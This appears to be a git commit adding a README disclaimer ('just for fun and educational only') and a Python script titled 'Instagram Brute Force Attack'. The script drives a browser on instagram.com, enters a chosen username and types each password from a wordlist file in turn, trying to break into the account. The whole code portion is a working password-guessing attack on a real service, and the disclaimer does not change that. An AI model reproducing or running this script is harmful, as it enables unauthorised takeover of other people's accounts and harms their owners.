6ede334502a09f5db46f374cf46cfa9515c93742
theDreamer911 <thetrulydreamer@gmail.com>
2021-01-22 21:57:30 +0700

    Instagram Brute Force Attack

---
+++ README.md
@@ -0,0 +1,1 @@
+"Disclaimer: This is not Hacking Repository, this just for fun and educational only. Any violence because of this, is beyond my responsibility" 
---
+++ instagram-brute-force.py
@@ -0,0 +1,32 @@
+from webbot import Browser
+from pynput.keyboard import Key, Controller
+import time
+username = input('Username: ')
+dictionary = input('Pilih file bruteforce: ')
+
+file = open(f'{dictionary}.txt', 'r')
+bruteforce = []
+for line in file:
+    line = line.strip()
+    bruteforce.append(line)
+file.close()
+
+web = Browser()
+keyboard = Controller()
+
+
+web.go_to('www.instagram.com')
+time.sleep(3)
+keyboard.press(Key.enter)
+keyboard.release(Key.enter)
+time.sleep(3)
+keyboard.press(Key.tab)
+keyboard.release(Key.tab)
+time.sleep(3)
+web.type(username)
+keyboard.press(Key.tab)
+keyboard.release(Key.tab)
+for brute in bruteforce:
+    web.type(brute, into="Password")
+    keyboard.press(Key.enter)
+    keyboard.release(Key.enter)
